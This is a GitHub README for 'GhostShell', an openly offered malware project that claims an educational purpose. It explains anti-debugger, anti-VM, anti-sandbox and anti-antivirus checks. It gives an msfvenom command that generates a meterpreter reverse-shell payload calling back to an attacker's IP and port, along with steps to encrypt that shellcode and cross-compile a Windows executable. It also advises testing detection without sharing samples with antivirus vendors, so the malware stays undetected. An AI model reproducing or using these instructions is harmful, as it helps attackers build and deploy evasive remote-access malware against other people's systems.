<div align="center">
  <h1 align="center"> GhostShell </h1>
  <p align="center"> In this malware, are used some techniques to try bypass the AVs, VMs, and Sandboxes, with only porpuse to learning more. I'm not responsible for your actions. </p>


  <p align="center"> 
    <img alt="license" src="https://img.shields.io/github/license/ReddyyZ/GhostShell"/>
    <img alt="last-commit" src="https://img.shields.io/github/last-commit/ReddyyZ/GhostShell"/>
    <img alt="made-by" src="https://img.shields.io/badge/made%20by-ReddyyZ-red"/>
    <img alt="size" src="https://img.shields.io/github/repo-size/ReddyyZ/GhostShell"/>
    <img alt="binary-size" src="https://img.shields.io/badge/binary%20size-46%2C8%20KB-blue"/>
  </p>
  <p align="center">
    <a href="https://github.com/ReddyyZ"> <img alt="followers" src="https://img.shields.io/github/followers/ReddyyZ?style=social"/> </a>
    <a href="https://github.com/ReddyyZ/GhostShell/stargazers"><img alt="stars" src="https://img.shields.io/github/stars/ReddyyZ/GhostShell?style=social"/></a>
    <a href="https://github.com/ReddyyZ/GhostShell/network/members"><img alt="forks" src="https://img.shields.io/github/forks/ReddyyZ/GhostShell?style=social"/> </a>
    <a href="https://github.com/ReddyyZ/GhostShell/watchers"><img alt="watchers" src="https://img.shields.io/github/watchers/ReddyyZ/GhostShell?style=social"/> </a>
  </p>
  
</div>

<p align="center">
  <a href="#bomb-bypass-techniques"> Bypass Techniques </a> |
  <a href="#radioactive-generating-the-shellcode"> Generating the Shellcode </a> |
  <a href="#computer-how-to-compile-for-windows-on-linux"> How to compile for Windows on Linux </a> |
  <a href="#book-credits"> Credits </a> |
  <a href="#memo-license"> License </a>
</p>


- ## :warning: Atention!!!
**To check if the antivirus is detecting the malware, never send it to the virus, it will be sent to the antivirus companies and will be broken, to analyze, send it to https://www.hybrid-analysis.com/ and remember to check the option "Do not send my sample to non-affiliated third parties", as in the example below.**




- ## :bomb: Bypass Techniques

### **Anti-Debugger**

To try bypass the Debuggers, I'm using the "IsDebuggerPresent()" of "Windows.h" librarie to checks if a debugger is running.

### **Anti-VM / Anti-Sandbox / Anti-AV**

- **Enumerate Process Function**

  Enumerates all process running on the system, and compares to the process in the black-list, if found a process and this is equal to any process in the black-list returns -1 (identified).

- **Sleep Acceleration Check Function**

  First, gets the current time, and sleeps 2 minutes, then, gets the time again, and compare, if the difference is less than 2, returns -1 (identified).

- **Mac Address Check Function**

  Gets the system mac address and compare to the macs, in the black-list, if the system mac address is equal to any mac in the black-list returns -1 (identified).


- ## :radioactive: Generating the Shellcode
![Generating](/assets/generating%20shellcode.gif)

To generate the shellcode type in the terminal: ``` msfvenom -p windows/meterpreter/reverse_shell lhost=(IP) lport=(PORT) -f c ```, copy the shellcode generated and encrypt it.                                                                                                 

To encrypt shellcode use the encrypt_shellcode script.                                                                                   
On linux type: ``` ./encrypt_shellcode e "(KEY, ex: "\xda\xe6\x1d\x5c\x9v\x8d") "(shellcode)"" ```                                      
On windows type: ``` encrypt_shellcode.exe e "(KEY, ex: "\xda\xe6\x1d\x5c\x9v\x8d") "(shellcode)"" ```



- ## :computer: How to compile for Windows on Linux

To compile for Windows on Linux, first, install mingw-w64: ``` sudo apt-get install mingw-w64 ```, then, to compile for 32 bits: ``` i686-w64-mingw32-gcc -o main.exe main.c -l psapi -static ```, and to 64 bits: ``` x86_64-w64-mingw32 -o main.exe main.c -l psapi -static ```

-  ## :book: Credits

Credits for https://github.com/rastating, the encrypt_shellcode is based on a post of your github.io: https://rastating.github.io/creating-a-shellcode-crypter/



- ## :memo: License

This project is under MIT license. See at here [LICENSE](/LICENSE.md) for more informations.
